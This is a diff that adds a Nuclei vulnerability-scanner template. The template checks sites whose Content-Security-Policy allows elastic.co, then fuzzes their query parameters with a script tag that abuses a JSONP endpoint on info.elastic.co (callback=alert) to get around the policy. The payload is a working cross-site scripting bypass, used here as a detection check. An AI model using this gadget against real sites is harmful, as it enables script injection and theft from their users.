@@ -1,0 +1,55 @@
+id: elastic-info-csp-bypass
+
+info:
+  name: Content-Security-Policy Bypass - Elastic Info
+  author: renniepak,DhiyaneshDK
+  severity: medium
+  reference:
+    - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
+  metadata:
+    verified: true
+  tags: xss,csp-bypass,elastic-info
+
+flow: http(1) && headless(1)
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "Content-Security-Policy"
+          - "elastic.co"
+        condition: and
+        internal: true
+
+headless:
+  - steps:
+      - action: navigate
+        args:
+          url: "{{BaseURL}}"
+
+      - action: waitdialog
+        name: elastic_info_csp_xss
+        args:
+          max-duration: 5s
+
+    payloads:
+      injection:
+        - '<script src="https://info.elastic.co/index.php/form/getForm?munchkinId=813-MAM-392&form=6196&callback=alert"></script>'
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{url_encode(injection)}}"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "elastic_info_csp_xss == true"
+# digest: 4a0a00473045022100caba2947d455377b63edf748cdd0348e0db1627aeeeee54d295b9467f1f8f7c7022029fd86ccf2830f3851162f887f73d581f88fd632d2c251809b37df027fb290c9:922c64590222798bb761d5b6d8e72950
